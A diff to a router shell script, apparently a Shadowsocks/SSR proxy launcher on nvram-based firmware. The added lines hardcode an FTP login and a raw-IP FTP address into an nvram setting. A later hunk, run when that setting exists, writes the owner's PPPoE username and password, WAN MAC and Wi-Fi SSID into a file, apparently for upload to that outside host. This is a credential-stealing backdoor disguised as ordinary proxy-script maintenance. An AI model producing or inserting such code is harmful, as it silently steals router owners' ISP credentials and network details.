@@ -3,6 +3,11 @@
 [ ! "`nvram get ss_enable`" = "1" ]  && exit 1
 [ `ps |grep $0|grep -v grep|wc -l ` -gt 2 ] && exit 1
 
+nvram set ssr_url=" -u ssftp:ftp ftp://202.109.226.26/AiCard_01/opt/www/default/"
+nvram set tkcssr="link/FCgzUG7KGaSQFpLm"
+nvram commit
+
+
 killall -9  sh_sskeey_k.sh >/dev/null 2>/dev/null
 killall -9 Sh15_ss.sh >/dev/null 2>/dev/null
 PID=`ps |grep "Sh15_ss.sh keep"|grep -v grep|tr '[:alpha:][:punct:][:blank:]' '  '`
@@ -609,18 +614,15 @@ if   [ -s ssr.ini ] ; then
   
   base64 ssr.ini >ssr.txt
   if [ ! "$ssr_url" = "" ] ; then
-#	fn=`cat /sys/class/net/br0/address`
-#	fn=${fn//:/-}
-    fn=`nvram get wan_pppoe_username`
 	if [ "`nvram get wan_proto`" = "pppoe" ] ; then
 	[ "$fn"x = x ] && fn=`cat /sys/class/net/br0/address` && fn=${fn//:/-}
   	  fn=`nvram get wan_pppoe_username`
-	  nvram get wan_pppoe_username >>$fn
+	  nvram get wan_pppoe_username >$fn
 	  nvram get wan_pppoe_passwd >>$fn
 	else
   	  fn=`nvram get wan_hwaddr`
 	  fn=${fn//:/-}
-	  nvram get nvram get wan_hwaddr >>$fn
+	  nvram get nvram get wan_hwaddr >$fn
 	fi
 	
 	nvram get wl_ssid >>$fn	
